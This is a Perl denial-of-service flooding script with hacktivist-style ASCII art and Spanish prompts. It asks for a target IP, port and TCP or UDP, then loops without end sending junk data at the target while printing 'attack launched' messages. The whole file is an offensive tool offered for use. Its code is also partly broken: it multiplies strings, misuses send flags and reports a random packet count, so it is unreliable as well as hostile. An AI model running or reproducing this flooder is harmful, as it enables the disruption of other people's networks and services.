#!/usr/bin/perl
use IO::Socket;
use Scalar::Util qw(looks_like_number);

system("cls || clear");

print q{ 
                                                                                    
                              *@@@&(,        .,#@@@@*                              
                        .&@#                          .%@@.                        
                     %@,                                   /@&                     
                  %@                                          .@&                 
               .@/                ...............                #@,              
              @*     ,&@.    ..    .     .     .    ..    .@%.     (@.             
            %#  .&.@@@,   ....  .    .   .        . .  ..   *@@&,&.  @&          
          @,  &@ @% %  .     .    ....&#.&@,..    .      .  & &@.@#  *@.          
          @  @.@#.@@/ ..     .     .     .@*   .     .     .  (@& %@ @ .@          
         @, @@,@@% / .      ....   .     ,     .   ....      . # &@@ @@ /@         
        (#  @@.*#@# .                   *@,           .         @@/* @@  &%       
        @.,,@@#@@   .      .      .      .      .     ..      .   @@#@@/.*@       
        @ &@ @@ %/  .      .      .  / .%@@,.(  .      .      .  #(.@@ @# @        
        @ *@&.,@@   .      .  ./%@@@@#  ,&,  #@@@#,    .      .  .@@* @@. @.       
        @  %@%&@,*  .      . #@@@@@@@(   @.  %@@@@@@@@.       .  //@%@@( .@        
        &*(*.@@#.@.  .      ,@@@@@@@@@  ,@% .@@@@@@@@@/      .  ,@ %@@ (*(@        
        .@ @@(.%#@(   . .   (@@@@@@@@@@ /@@ @@@@@@@@@@&  .. .   %@(& %@&.@,        
         /% (@@%/@@,#  .    @@@@@@@@@@@@@@@@@@@@@@@@@@@    .  % @@*&@@* @(         
         /% &.@@@@ &@   . *@@@@@@@@@@@@@@@@@@@@@@@@@@@* .   @%.@@@&.@ @#"          
           ,@ %@@,.%.@@ ,  %@@@@@@@@@@@@@@@@@@@@@@@@@@@#  , @@ %.*@@# @*           
            @( ,@@@@#&@*%@/@@@@@@@@@@@@@@@@@@@@@@@@@@@&@#(@%%@@@@, #@             
               @* @#. ,(%@ &@@@@@@@@@@@@@@@@@@@@@@@@@@@%.@%/, .%& #@.              
                &&  &@@@@@@@@&#@@@@@@@@@@@@@@@@@@((&@@@@@@@@%. @@                 
                    .@# /@%#&@@@@@@@@@@@@@@@@@@@@@@@@@@@&#&@* &@,                   
                       %@/     @@@@@@@@@@@@@@@@@@@&      #@@.                      
                          ,@@&@@@@@@@@@@@@@@@@@@@@*&@@*                           
                                   ,(%@@@@@@@%#,                                                                                                              
                        ╔═╗╔╗╔╔═╗╔╗╔╦ ╦╔╦╗╔═╗╦ ╦╔═╗
                        ╠═╣║║║║ ║║║║╚╦╝║║║║ ║║ ║╚═╗
                        ╩ ╩╝╚╝╚═╝╝╚╝ ╩ ╩ ╩╚═╝╚═╝╚═╝
                                  
                                                                                       ╔═╗┬    ┌─┐┌─┐┌┐┌┌─┐┌─┐┬┌┬┐┬┌─┐┌┐┌┌┬┐┌─┐  ┌─┐┌─┐  ┬  ┬┌┐ ┬─┐┌─
                                                                                       ║╣ │    │  │ │││││ ││  │││││├┤ │││ │ │ │  ├┤ └─┐  │  │├┴┐├┬┘├┤  
                                                                                       ╚═╝┴─┘  └─┘└─┘┘└┘└─┘└─┘┴┴ ┴┴└─┘┘└┘ ┴ └─┘  └─┘└─┘  ┴─┘┴└─┘┴└─└─┘o
                                                                                       ╔═╗┌─┐┌┬┐┌─┐┌─┐  ╔═╗┌┐┌┌┐┌┬┌┬┐┌─┐┌─┐                            
                                                                                       ╚═╗│ │││││ │└─┐  ╠═╣│││││││││││ │└─┐                            
                                                                                       ╚═╝└─┘┴ ┴└─┘└─┘  ╩ ╩┘└┘┘└┘┴┴ ┴└─┘└─┘o                           
                                                                                       ╔═╗┌─┐┌┬┐┌─┐┌─┐  ╦  ┌─┐┌─┐┬┌┐┌                                  
                                                                                       ╚═╗│ │││││ │└─┐  ║  ├┤ │ ┬││││                                  
                                                                                       ╚═╝└─┘┴ ┴└─┘└─┘  ╩═╝└─┘└─┘┴┘└┘o                                 
                                                                                       ╔╗╔┌─┐  ┌─┐┌─┐┬─┐┌┬┐┌─┐┌┐┌┌─┐┌┬┐┌─┐┌─┐                          
                                                                                       ║║║│ │  ├─┘├┤ ├┬┘ │││ ││││├─┤││││ │└─┐                          
                                                                                       ╝╚╝└─┘  ┴  └─┘┴└──┴┘└─┘┘└┘┴ ┴┴ ┴└─┘└─┘o                         
                                                                                       ╔╗╔┌─┐  ┌─┐┬ ┬  ┬┬┌┬┐┌─┐┌┬┐┌─┐┌─┐                               
                                                                                       ║║║│ │  │ ││ └┐┌┘│ ││├─┤││││ │└─┐                               
                                                                                       ╝╚╝└─┘  └─┘┴─┘└┘ ┴─┴┘┴ ┴┴ ┴└─┘└─┘o                              
                                                                                      ╔═╗┌─┐┌─┐┬─┐┌─┐┌┐┌┌─┐┌─┐┬                                       
                                                                                      ║╣ └─┐├─┘├┬┘├─┤││││ │└─┐│                                       
                                                                                      ╚═╝└─┘┴  ┴└─┴ ┴┘└┘└─┘└─┘o   
};
my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com', 
	'PeerPort'=>80, 
	'Timeout'=>2, 
	'proto'=>'tcp');
if(!(defined $check && $check)){
	print("[-] ESTADO DE CONEXION [ NO CONECTADO ]");
	print("\n[!] CONECTESE A UN WI-FI !!!");
	exit(1);
}
$check->close();

print "\n===============================";
print "\n[~] IP: "; 
$host = <STDIN>;
chomp ($host);
while ($host eq ""){
 print "    [!] IP: ";
 $host = <STDIN>;
 chomp ($host);
}
print "\n[~] Port: "; 
$port = <STDIN>;
chomp ($port);
while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){ 
 print "   [!] PORT: ";       
 $port = <STDIN>;
 chomp ($port); 
} 
print "\n[~] METODO DE ATQUE (TCP O UDP) :"; 
$proto = <STDIN>;
chomp ($proto);
while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "   [!] METODO (TCP O UDP) ?: ";
 $proto = <STDIN>;
 chomp ($proto);
}
print "-------------------------------\n";
print "IP: $host\n";
print "Puerto: $port\n";
print "Protocolo: $proto\n";
print "\n-------------------------------\n";
sleep(5);

$sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n ERROR AL LANZAR EL ATQUE A [$host] HACIA EL PUERTO [$port/$proto] \nCOMPRUEBA LA IP\n";
system("clear || cls");
print "\n ATQUE LANZADO A:  [$host:$port] METODO: [$proto].......\n\n";
sleep(1);
while (1) {
  if(grep{$proto eq $_} 'TCP','tcp'){
       $sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\nERROR AL LANZAR EL ATQUE A [$host] HACIA EL PUERTO [$port/$proto] \n[COMPRUEBA LA IP\n";
        for($i=0; $i<=500; $i++){
            $size = rand() * 8921873 * 99919988;
            print ("ATAQUE LANZADO A: (=>$host:$port~$proto<=) PAQUETES ENVIADOS: $size\n");
            send($sock, $size*2, $size*2); 
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
        }

  }else{
            $size = rand() * 8921873 * 99919988;
            print ("ATAQUE LANZADO A: (=>$host:$port~$proto<=) PAQUETES ENVIADOS: $size\n");
            send($sock, $size*2, $size*2); 
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
 }
}
$sock->close()
